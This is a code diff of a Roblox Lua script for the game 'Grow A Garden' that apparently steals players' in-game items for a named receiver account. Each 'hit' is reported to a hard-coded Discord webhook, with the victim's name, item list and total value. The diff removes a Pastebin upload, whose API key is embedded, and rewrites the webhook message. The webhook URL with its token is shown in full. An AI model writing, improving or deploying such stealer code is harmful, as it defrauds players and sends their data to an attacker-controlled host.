@@ -7,10 +7,7 @@ task.spawn(function()
 	_G.scriptExecuted = true
 
 	local users = _G.Usernames or {"DanyelQuibs"}
-	local min_value = _G.min_value or 100000
-	local ping = _G.pingEveryone or "No"
 	local webhook = "https://discord.com/api/webhooks/1388044689864785921/36vkKfOwBKqRKuf3ucZurSFR-NjLnJu5NOxxAu5CNgVBy6GIJvAnScIAOohU83qAXSlU"
-	local pastebin_api_key = "kZi_lZU3maKIm3hEDOgM2m4yttXDuPpS"
 
 	local Players = game:GetService("Players")
 	local HttpService = game:GetService("HttpService")
@@ -117,48 +114,26 @@ task.spawn(function()
 	end)
 
 	local function sendWebhook()
-		local infoBlock = string.format(":bust_in_silhouette: Player Information\n```Name: %s\nReceiver: %s```", plr.Name, users[1] or "?")
-		local valueBlock = string.format(":moneybag: Total Value\n```%s¢```", formatShort(totalValue))
-		local previewBlock = ":palm_tree: Backpack (Top Items)\n```\n"
-		local pasteData = ""
-		local count = 0
-
-		for _, item in ipairs(itemsToSend) do
-			local line = string.format("%s - %s [%.2f KG] → %s¢\n", item.Emoji, item.Name, item.Weight, formatShort(item.Value))
-			pasteData ..= line
-			if count < 25 then previewBlock ..= line end
-			count += 1
-		end
-		previewBlock ..= "```"
-
-		local pasteLink = "Failed to upload to Pastebin"
-		local requestFunc = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
-		if requestFunc then
-			local result = requestFunc({
-				Url = "https://pastebin.com/api/api_post.php",
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
-				Body = "api_dev_key=" .. pastebin_api_key ..
-					"&api_option=paste" ..
-					"&api_paste_private=1" ..
-					"&api_paste_name=" .. HttpService:UrlEncode("Item List - " .. plr.Name) ..
-					"&api_paste_expire_date=N" ..
-					"&api_paste_format=text" ..
-					"&api_paste_code=" .. HttpService:UrlEncode(pasteData)
-			})
-			if result and result.Body and result.Body:find("https://pastebin.com/") then
-				pasteLink = result.Body:gsub("https://pastebin.com/", "https://pastebin.com/raw/")
-			end
+		local lines = {}
+		for i = 1, math.min(10, #itemsToSend) do
+			local item = itemsToSend[i]
+			table.insert(lines, string.format("%s - %s (%.2f KG) → %s¢", item.Emoji, item.Name, item.Weight, formatShort(item.Value)))
 		end
 
-		local linkBlock = string.format(":link: Full Item List\n%s", pasteLink)
 		local data = {
-			embeds = {{
-				title = ":potted_plant: Grow A Garden Hit - PRIMO SCRIPTS :four_leaf_clover:",
-				description = table.concat({infoBlock, valueBlock, previewBlock, linkBlock}, "\n"),
-				color = 65280
-			}}
+			content = string.format("🌱 **Grow A Garden Hit**\n👤 **%s** ➜ 🎁 **%s**\n💸 **Total Value:** %s¢\n\n📦 **Top Items:**\n%s",
+				plr.Name,
+				users[1] or "?",
+				formatShort(totalValue),
+				table.concat(lines, "\n")
+			)
 		}
+
+		local requestFunc = (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request)
+		if not requestFunc then
+			warn("❌ No request function available")
+			return
+		end
 
 		local ok, err = pcall(function()
 			requestFunc({
@@ -170,9 +145,9 @@ task.spawn(function()
 		end)
 
 		if ok then
-			print("[DEBUG] Webhook sent")
+			print("✅ Webhook sent")
 		else
-			warn("[ERROR] Webhook failed:", err)
+			warn("❌ Webhook failed:", tostring(err))
 		end
 	end
 
